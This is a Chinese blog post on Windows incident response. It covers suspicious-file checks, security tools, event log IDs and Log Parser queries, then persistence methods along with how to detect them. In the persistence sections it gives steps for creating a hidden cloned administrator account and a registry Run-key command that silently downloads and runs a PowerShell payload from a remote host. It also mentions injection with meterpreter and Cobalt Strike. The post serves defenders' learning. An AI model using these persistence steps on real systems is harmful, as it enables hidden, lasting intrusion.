检查系统相关信息</h5><p>1、查看系统版本以及补丁信息</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入 <code>systeminfo</code>，查看系统信息。(特别关注新爆出来的0day,nday漏洞，及时打补丁)</li></ul><p>2、查找可疑目录及文件</p><ul><li><p>检查方法：</p><p>a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Window 2003版本 C:\Documents and Settings</span><br><span class="line">Window 2008R2及以后版本 C:\Users\</span><br></pre></td></tr></table></figure><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803142847304.png" alt="image-20250803142847304"></p><p>b、单击【开始】&gt;【运行】，输入 <code>%UserProfile%\Recent</code>，分析最近打开分析可疑文件。</p><p>c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</p><p>d、回收站、浏览器下载目录、浏览器历史记录</p><p>e、修改时间在创建时间之前的为可疑文件</p></li></ul><p>3、发现并得到 WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p>​    a、利用 <a href="http://www.torchsoft.com/en/rw_information.html">Registry Workshop</a> 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。<br>​    b、利用计算机自带文件搜索功能，指定修改时间进行搜索。</p><h5 id="1-5-自动化查杀"><a href="#1-5-自动化查杀" class="headerlink" title="1.5 自动化查杀"></a>1.5 自动化查杀</h5><ul><li><p>病毒查杀</p><ul><li>检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。</li></ul></li><li><p>webshell查杀</p><ul><li>检查方法：选择具体站点路径进行webshell查杀，建议使用两款 WebShell 查杀工具同时查杀，可相互补充规则库的不足。</li></ul></li></ul><h5 id="1-6-日志分析"><a href="#1-6-日志分析" class="headerlink" title="1.6 日志分析"></a>1.6 日志分析</h5><p>系统日志</p><ul><li><p>分析方法：</p><p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>b、Win+R 打开运行，输入 “eventvwr.msc”，回车运行，打开”事件查看器”。</p><p>C、导出应用程序日志、安全日志、系统日志，利用 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。</p></li></ul><p>Web 访问日志</p><ul><li><p>分析方法：</p><p>a、找到中间件的web日志，打包到本地方便进行分析。</p><p>b、推荐工具：Windows 下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。Linux 下，使用 Shell 命令组合查询分析。</p></li></ul><h4 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h4><h5 id="2-1-病毒分析"><a href="#2-1-病毒分析" class="headerlink" title="2.1 病毒分析"></a>2.1 病毒分析</h5><p>PCHunter：<a href="http://www.xuetr.com/">http://www.xuetr.com</a></p><p>火绒剑：<a href="https://www.huorong.cn/">https://www.huorong.cn</a></p><p>Process Explorer：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p><p>processhacker：<a href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></p><p>autoruns：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></p><p>OTL：<a href="https://www.bleepingcomputer.com/download/otl/">https://www.bleepingcomputer.com/download/otl/</a></p><p>SysInspector：<a href="http://download.eset.com.cn/download/detail/?product=sysinspector">http://download.eset.com.cn/download/detail/?product=sysinspector</a></p><h5 id="2-2-病毒查杀"><a href="#2-2-病毒查杀" class="headerlink" title="2.2 病毒查杀"></a>2.2 病毒查杀</h5><p>卡巴斯基：<a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a>   （推荐理由：绿色版、最新病毒库）</p><p>大蜘蛛：<a href="http://free.drweb.ru/download+cureit+free%EF%BC%88%E6%8E%A8%E8%8D%90%E7%90%86%E7%94%B1%EF%BC%9A%E6%89%AB%E6%8F%8F%E5%BF%AB%E3%80%81%E4%B8%80%E6%AC%A1%E4%B8%8B%E8%BD%BD%E5%8F%AA%E8%83%BD%E7%94%A81%E5%91%A8%EF%BC%8C%E6%9B%B4%E6%96%B0%E7%97%85%E6%AF%92%E5%BA%93%EF%BC%89">http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）</a></p><p>火绒安全软件：<a href="https://www.huorong.cn/">https://www.huorong.cn</a></p><p>360杀毒：<a href="http://sd.360.cn/download_center.html">http://sd.360.cn/download_center.html</a></p><h5 id="2-3-病毒动态"><a href="#2-3-病毒动态" class="headerlink" title="2.3 病毒动态"></a>2.3 病毒动态</h5><p>CVERC-国家计算机病毒应急处理中心：<a href="http://www.cverc.org.cn/">http://www.cverc.org.cn</a></p><p>微步在线威胁情报社区：<a href="https://x.threatbook.cn/">https://x.threatbook.cn</a></p><p>火绒安全论坛：<a href="http://bbs.huorong.cn/forum-59-1.html">http://bbs.huorong.cn/forum-59-1.html</a></p><p>爱毒霸社区：<a href="http://bbs.duba.net/">http://bbs.duba.net</a></p><p>腾讯电脑管家：<a href="http://bbs.guanjia.qq.com/forum-2-1.html">http://bbs.guanjia.qq.com/forum-2-1.html</a></p><h5 id="2-4-在线病毒扫描网站"><a href="#2-4-在线病毒扫描网站" class="headerlink" title="2.4 在线病毒扫描网站"></a>2.4 在线病毒扫描网站</h5><p>Virustotal：<a href="https://www.virustotal.com/">https://www.virustotal.com</a></p><p>Virscan：<a href="http://www.virscan.org/">http://www.virscan.org</a></p><p>腾讯哈勃分析系统：<a href="https://habo.qq.com/">https://habo.qq.com</a></p><p>Jotti 恶意软件扫描系统：<a href="https://virusscan.jotti.org/">https://virusscan.jotti.org</a></p><h5 id="2-5-webshell查杀"><a href="#2-5-webshell查杀" class="headerlink" title="2.5 webshell查杀"></a>2.5 webshell查杀</h5><p>D盾_Web查杀：<a href="http://www.d99net.net/index.asp">http://www.d99net.net/index.asp</a></p><p>河马 WebShell 查杀：<a href="http://www.shellpub.com/">http://www.shellpub.com</a></p><h3 id="Windows日志分析"><a href="#Windows日志分析" class="headerlink" title="Windows日志分析"></a>Windows日志分析</h3><h4 id="0x01-Windows事件日志简介"><a href="#0x01-Windows事件日志简介" class="headerlink" title="0x01 Windows事件日志简介"></a>0x01 Windows事件日志简介</h4><p>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p><p>Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p><p><strong>系统日志</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT/2000操作系统预先定义。</span><br><span class="line"></span><br><span class="line">默认位置： %SystemRoot%\System32\Winevt\Logs\System.evtx</span><br></pre></td></tr></table></figure><p><strong>应用程序日志</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 </span><br><span class="line"></span><br><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\Application.evtx</span><br></pre></td></tr></table></figure><p><strong>安全日志</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。</span><br><span class="line"></span><br><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\Security.evtx</span><br></pre></td></tr></table></figure><p>​系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。 安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。 </p><h4 id="0X02-审核策略与事件查看器"><a href="#0X02-审核策略与事件查看器" class="headerlink" title="0X02 审核策略与事件查看器"></a>0X02 审核策略与事件查看器</h4><p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>PS：默认状态下，也会记录一些简单的日志，日志默认大小20M</p><p><strong>设置1</strong>：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略，参考配置操作：</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803152322124.png" alt="image-20250803152322124"></p><p><strong>设置2</strong>：设置合理的日志属性，即日志最大大小、事件覆盖阀值等： </p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803152425833.png" alt="image-20250803152425833"></p><p><strong>查看系统日志方法：</strong></p><ol><li>在**“开始”<strong>菜单上，依次指向</strong>“所有程序”<strong>、</strong>“管理工具”<strong>，然后单击</strong>“事件查看器”**</li><li>按 “<strong>Window+R</strong>“，输入 ”<strong>eventvwr.msc</strong>“ 也可以直接进入“<strong>事件查看器</strong>”</li></ol><h4 id="0x03-事件日志分析"><a href="#0x03-事件日志分析" class="headerlink" title="0x03 事件日志分析"></a>0x03 事件日志分析</h4><p>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明：</p><table><thead><tr><th align="left">事件ID</th><th>说明</th></tr></thead><tbody><tr><td align="left">4624</td><td>登录成功</td></tr><tr><td align="left">4625</td><td>登录失败</td></tr><tr><td align="left">4634</td><td>注销成功</td></tr><tr><td align="left">4647</td><td>用户启动的注销</td></tr><tr><td align="left">4672</td><td>使用超级用户（如管理员）进行登录</td></tr><tr><td align="left">4720</td><td>创建用户</td></tr></tbody></table><p>每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式：</p><table><thead><tr><th align="left">登录类型</th><th>描述</th><th>说明</th></tr></thead><tbody><tr><td align="left">2</td><td>交互式登录（Interactive）</td><td>用户在本地进行登录。</td></tr><tr><td align="left">3</td><td>网络（Network）</td><td>最常见的情况就是连接到共享文件夹或共享打印机时。</td></tr><tr><td align="left">4</td><td>批处理（Batch）</td><td>通常表明某计划任务启动。</td></tr><tr><td align="left">5</td><td>服务（Service）</td><td>每种服务都被配置在某个特定的用户账号下运行。</td></tr><tr><td align="left">7</td><td>解锁（Unlock）</td><td>屏保解锁。</td></tr><tr><td align="left">8</td><td>网络明文（NetworkCleartext）</td><td>登录的密码在网络上是通过明文传输的，如FTP。</td></tr><tr><td align="left">9</td><td>新凭证（NewCredentials）</td><td>使用带&#x2F;Netonly参数的RUNAS命令运行一个程序。</td></tr><tr><td align="left">10</td><td>远程交互，（RemoteInteractive）</td><td>通过终端服务、远程桌面或远程协助访问计算机。</td></tr><tr><td align="left">11</td><td>缓存交互（CachedInteractive）</td><td>以一个域用户登录而又没有域控制器可用</td></tr></tbody></table><p>关于更多EVENT ID，详见微软官方网站上找到了“Windows Vista 和 Windows Server 2008 中的安全事件的说明”。</p><blockquote><p>原文链接 ：<a href="https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008">https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008</a></p></blockquote><p>案例1：可以利用eventlog事件来查看系统账号登录情况：</p><ol><li><p>在**“开始”<strong>菜单上，依次指向</strong>“所有程序”<strong>、</strong>“管理工具”<strong>，然后单击</strong>“事件查看器”**；</p></li><li><p>在事件查看器中，单击**“安全”**，查看安全日志；</p></li><li><p>在安全日志右侧操作中，点击**“筛选当前日志”**，输入事件ID进行筛选。</p><p>4624  –登录成功<br>4625  –登录失败<br>4634 – 注销成功<br>4647 – 用户启动的注销<br>4672 – 使用超级用户（如管理员）进行登录</p></li></ol><p>如果出现大量打4625登录错误，那么大概率被暴力破解</p><p>案例2：可以利用eventlog事件来查看计算机开关机的记录： </p><p>1、在**“开始”<strong>菜单上，依次指向</strong>“所有程序”<strong>、</strong>“管理工具”<strong>，然后单击</strong>“事件查看器”**；</p><p>2、在事件查看器中，单击**“系统”**，查看系统日志；</p><p>3、在系统日志右侧操作中，点击**“筛选当前日志”**，输入事件ID进行筛选。</p><p>其中事件ID 6006 ID6005、 ID 6009就表示不同状态的机器的情况（开关机）。<br>6005 信息 EventLog 事件日志服务已启动。(开机)<br>6006 信息 EventLog 事件日志服务已停止。(关机)<br>6009 信息 EventLog 按ctrl、alt、delete键(非正常)关机</p><h4 id="0x04-日志分析工具"><a href="#0x04-日志分析工具" class="headerlink" title="0x04 日志分析工具"></a>0x04 日志分析工具</h4><h4 id="Log-Parser"><a href="#Log-Parser" class="headerlink" title="Log Parser"></a>Log Parser</h4><p>Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。</p><p>Log Parser 2.2下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p><p>Log Parser 使用示例：<a href="https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/">https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/</a></p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/log-1-6.png"></p><p><strong>基本查询结构</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Logparser.exe –i:EVT –o:DATAGRID &quot;SELECT * FROM c:\xx.evtx&quot;</span><br></pre></td></tr></table></figure><p><strong>使用Log Parser分析日志</strong></p><p>1、查询登录成功的事件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">登录成功的所有事件</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where EventID=4624&quot;</span><br><span class="line"></span><br><span class="line">指定登录时间范围的事件：</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where TimeGenerated&gt;&#x27;2018-06-19 23:32:11&#x27; and TimeGenerated&lt;&#x27;2018-06-20 23:34:00&#x27; and EventID=4624&quot;</span><br><span class="line"></span><br><span class="line">提取登录成功的用户名和IP：</span><br><span class="line">LogParser.exe -i:EVT  –o:DATAGRID  &quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as Username,EXTRACT_TOKEN(Message,38,&#x27; &#x27;) as Loginip FROM c:\Security.evtx where EventID=4624&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 2、查询登录失败的事件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">登录失败的所有事件：</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where EventID=4625&quot;</span><br><span class="line"></span><br><span class="line">提取登录失败用户名进行聚合统计：</span><br><span class="line">LogParser.exe  -i:EVT &quot;SELECT  EXTRACT_TOKEN(Message,13,&#x27; &#x27;)  as EventType,EXTRACT_TOKEN(Message,19,&#x27; &#x27;) as user,count(EXTRACT_TOKEN(Message,19,&#x27; &#x27;)) as Times,EXTRACT_TOKEN(Message,39,&#x27; &#x27;) as Loginip FROM c:\Security.evtx where EventID=4625 GROUP BY Message&quot; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3、系统历史开关机记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT TimeGenerated,EventID,Message FROM c:\System.evtx where EventID=6005 or EventID=6006&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="LogParser-Lizard"><a href="#LogParser-Lizard" class="headerlink" title="LogParser Lizard"></a>LogParser Lizard</h4><p>对于GUI环境的Log Parser Lizard，其特点是比较易于使用，甚至不需要记忆繁琐的命令，只需要做好设置，写好基本的SQL语句，就可以直观的得到结果。</p><p>下载地址：<a href="http://www.lizard-labs.com/log_parser_lizard.aspx">http://www.lizard-labs.com/log_parser_lizard.aspx</a></p><p>依赖包：Microsoft .NET Framework 4 .5，下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=42642">https://www.microsoft.com/en-us/download/details.aspx?id=42642</a></p><p>查询最近用户登录情况：</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/log-1-7.png"></p><h4 id="Event-Log-Explorer"><a href="#Event-Log-Explorer" class="headerlink" title="Event Log Explorer"></a>Event Log Explorer</h4><p>Event Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。</p><p>下载地址：<a href="https://event-log-explorer.en.softonic.com/">https://event-log-explorer.en.softonic.com/</a></p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/log-1-8.png"></p><p>参考链接：</p><p>Windows日志分析   <a href="https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ">https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ</a></p><h3 id="Windows权限维持–隐藏"><a href="#Windows权限维持–隐藏" class="headerlink" title="Windows权限维持–隐藏"></a>Windows权限维持–隐藏</h3><h4 id="0x00-前言-1"><a href="#0x00-前言-1" class="headerlink" title="0x00 前言"></a>0x00 前言</h4><p>攻击者在获取服务器权限后，通常会用一些后门来维持权限，如果你想让你的后门保持的更久些，那么请隐藏好它，使之不易被管理员发现。</p><h4 id="0x01-隐藏文件"><a href="#0x01-隐藏文件" class="headerlink" title="0x01 隐藏文件"></a>0x01 隐藏文件</h4><p>1、利用文件属性</p><p>最简单的一种隐藏文件的方式，文件右键属性，勾选隐藏，点击确定后，在这个文件里看不到刚刚的文件了。(自欺欺人)</p><p>如何真正隐藏文件？</p><p>使用Attrib +s +a +h +r命令就是把原本的文件夹增加了系统文件属性、存档文件属性、只读文件属性和隐藏文件属性。</p><p><code>attrib +s +a +h +r  D:\test\project\test</code>.txt</p><p>这样就做到了真正的隐藏，不管你是否显示隐藏文件，此文件夹都看不见。</p><p>破解隐藏文件：</p><p>打开电脑文件夹选项卡，取消”隐藏受保护的操作系统文件“勾选，把”隐藏文件和文件夹“下面的单选选择“显示隐藏的文件、文件夹和驱动器”。</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803154215111.png" alt="image-20250803154215111"></p><p>对于一般的电脑小白有用</p><p><strong>2、驱动级文件隐藏</strong></p><p>驱动隐藏我们可以用过一些软件来实现，软件名字叫：Easy File Locker      </p><p>下载链接： <a href="http://www.xoslab.com/efl.html">http://www.xoslab.com/efl.html</a></p><p>如果你在网站目录未查找到相关文件，且系统目录存在存在以下文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c:\WINDOWS\xlkfs.dat</span><br><span class="line">c:\WINDOWS\xlkfs.dll</span><br><span class="line">c:\WINDOWS\xlkfs.ini</span><br><span class="line">c:\WINDOWS\system32\drivers\xlkfs.sys</span><br></pre></td></tr></table></figure><p>那么你，应该是遭遇了驱动级文件隐藏。</p><p>如何清除？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、查询服务状态： sc qc xlkfs</span><br><span class="line">2、停止服务： net stop xlkfs 服务停止以后，经驱动级隐藏的文件即可显现</span><br><span class="line">3、删除服务： sc delete xlkfs</span><br><span class="line">4、删除系统目录下面的文件，重启系统，确认服务已经被清理了。</span><br></pre></td></tr></table></figure><p>隐藏文件的方式还有很多，比如伪装成一个系统文件夹图标，利用畸形文件名、保留文件名无法删除，甚至取一个与系统文件很像的文件名并放在正常目录里面，很难辨别出来。</p><p>这些隐藏文件的方式早已不再是秘密，而更多的恶意程序开始实现“无文件”攻击，这种方式极难被发现。</p><h4 id="0x02-隐藏账号"><a href="#0x02-隐藏账号" class="headerlink" title="0x02 隐藏账号"></a>0x02 隐藏账号</h4><p>window 隐藏系统用户操作，CMD命令行下，建立了一个用户名为“test$”，密码为“abc123!”的简单隐藏账户,并且把该隐藏账户提升为了管理员权限。只对于电脑小白有用。</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803160043877.png" alt="image-20250803160043877"></p><p>去查一下注册表或者lusrmgr.msc一下就看出来了</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803160326581.png" alt="image-20250803160326581"></p><p>克隆账号制作过程：</p><p>1、“开始”→“运行”，输入“regedt32.exe”后回车,需要到“HKEY_LOCAL_MACHINE\SAM\SAM”，单机右建权限，把名叫：administrator的用户给予：完全控制以及读取的权限，在后面打勾就行，然后关闭注册表编辑器，再次打开即可。</p><p>2、来到注册表编辑器的“HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names”处，点击test$用户，得到在右边显示的键值中的“类型”一项显示为0x3ea，找到箭头所指目录。</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803160725986.png" alt="image-20250803160725986"></p><p>3、找到administrator所对应的的项为“000001F4”，将“000001F4”的F值复制到“000003EA”的F值中，保存。</p><p>4、分别test$和“000003EA导出到桌面，删除test$用户   net user test$ &#x2F;del</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803161115191.png" alt="image-20250803161115191"></p><p>5、将刚才导出的两个后缀为.reg的注册表项导入注册表中。这样所谓的隐藏账户就创建好了。PS：不管你是在命令提示符下输入net user 或者在系统用户管理界面都是看不到test$这个账户的，只有在注册表中才能看得到。</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803161341862.png" alt="image-20250803161341862"></p><p>检测和清理方法：</p><p>使用D盾_web查杀工具，使用克隆账号检测功能进行查看，可检测出隐藏、克隆账号。</p><h4 id="0x03-端口复用"><a href="#0x03-端口复用" class="headerlink" title="0x03 端口复用"></a>0x03 端口复用</h4><p>通过端口复用来达到隐藏端口的目的，在Window下，如何实现端口复用呢？</p><p>前阵子，@Twi1ight公布了一种基于内置系统服务的端口复用后门方法，利用WinRM服务，一条命令实现端口复用后门：</p><p><code>winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125;</code></p><p>一般开启WinRM服务作为远程管理，但还是第一次听到可以作为端口复用，一种简单容易实现的端口复用方式。假设，攻击者已获取到administrator账号密码，连接远程WinRM服务执行命令：</p><h4 id="0x04-进程注入"><a href="#0x04-进程注入" class="headerlink" title="0x04 进程注入"></a>0x04 进程注入</h4><p>进程注入，一直是病毒木马的惯用手段，同时，它也是一种隐藏技术。在常见的渗透测试框架中，进程注入是怎么做的以及我们如何通过工具排查出来？</p><p><strong>1、meterpreter会话注入</strong></p><p>当前权限无法获取hash值，查看目前系统进程</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/privilege-1-10.png"></p><p>通过migrate将进程注入到system进程后，成功获得hash值。</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/privilege-1-11.png"></p><p>Window后门排查：</p><p>通过TCPview显示已建立的TCP连接，我们可以看到异常的连接，同时，恶意软件将以绿色显示不到一秒钟，然后变成红色消失，如此循环。 </p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/privilege-1-12.png"></p><p><strong>2、Empire会话进程注入</strong></p><p>通过psinject模块进行会话注入，直接输入ps选择一个SYSTEM权限的进程PID，使用进程注入模块，来获取权限。如下图：</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/privilege-1-13.png"></p><p>Window后门排查：利用process monitor或者火绒剑监控进程都可以定位到注入进程。</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/privilege-1-14.png"></p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/privilege-1-15.png"></p><p><strong>3、Cobalt Strike进程注入</strong></p><p>选择进程，点击inject，随后选择监听器，点击choose，即可发现Cobaltstrike弹回了目标机的一个新会话，这个会话就是成功注入到某进程的beacon。</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/privilege-1-16.png"></p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/privilege-1-17.png"></p><p>Window后门排查：利用process monitor捕捉通信过程，有规律的请求取决于sleep设置的间隔。</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/privilege-1-18.png"></p><h3 id="Windows权限维持–后门"><a href="#Windows权限维持–后门" class="headerlink" title="Windows权限维持–后门"></a>Windows权限维持–后门</h3><p>关键词：Windows系统后门、权限维持</p><p>在获取服务器权限后，通常会用一些后门技术来维持服务器权限，服务器一旦被植入后门，攻击者便如入无人之境。本文将对常见的window服务端自启动后门技术进行解析，知己知彼方能杜绝后门。</p><p><strong>0x01 注册表自启动</strong></p><p>通过修改注册表自启动键值，添加一个木马程序路径，实现开机自启动。</p><p>常用的注册表启动键：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Run键 </span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line"></span><br><span class="line"># Winlogon\Userinit键</span><br><span class="line">HKEY_CURRENT_USER\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon</span><br><span class="line"></span><br><span class="line">类似的还有很多,关键词：注册表启动键值。</span><br></pre></td></tr></table></figure><p>使用以下命令可以一键实现无文件注册表后门：</p><p><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v &quot;Keyname&quot; /t REG_SZ /d &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.28.142:8888/logo.gif&#39;))\&quot;&quot; /f</code></p><p><strong>Logon Scripts 后门</strong></p><p>注册表路径：HKEY_CURRENT_USER\Environment\</p><p>创建字符串键值：  UserInitMprLogonScript，键值设置为bat的绝对路径：<code>c:\test.bat</code></p><p><strong>userinit后门</strong></p><p>在用户进行登陆时，winlogon运行指定的程序。根据官方文档,可以更改它的值来添加与删除程序。</p><p>利用USERINIT注册表键实现无文件后门：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]</span><br><span class="line"> </span><br><span 